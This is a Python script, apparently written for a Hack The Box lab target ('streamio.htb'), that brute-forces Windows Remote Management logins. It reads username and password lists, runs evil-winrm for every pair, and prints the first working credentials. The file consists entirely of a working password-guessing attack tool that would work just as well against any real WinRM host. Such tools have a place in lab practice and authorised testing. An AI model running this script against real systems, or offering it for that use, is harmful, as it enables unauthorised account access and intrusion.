import subprocess,sys


password_file = "passwords.txt"     # List of passwords
username_file = "names.txt"         # List of names
target_ip = "streamio.htb"          # IP or FQDN


def gather_user_n_pass(pass_file: str, user_file: str) -> list:
    
    pass_list = []
    user_list = []
    
    with open(pass_file,'r') as temp_read:
        for line in temp_read.readlines():
            pass_list.append(line.strip('\n'))

    with open(user_file,'r') as temp_read:
        for line in temp_read.readlines():
            user_list.append(line.strip('\n'))

    return pass_list, user_list

def main() -> None:

    p_list, u_list = gather_user_n_pass(password_file,username_file)

    print(f"[+] Running evil-winrm with {username_file} and {password_file} at {target_ip}")

    for user in u_list:

        for password in p_list:
    
            print(f"[+] Attempting login for -- {user}:{password}")

            result = subprocess.run(["evil-winrm","-i",target_ip,"-u",user,"-p",password],text=True,capture_output=True)

            if result.returncode == 0:
                print(f"\n[+][+][+] Successful login -- {user}:{password} [+][+][+]")
                sys.exit()
            
            else:
                continue

    print("[+] No successful logins ...exiting")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[+] ...Exiting")
        sys.exit()
    except:
        print("[+] Error Occured ...Exiting")
        sys.exit()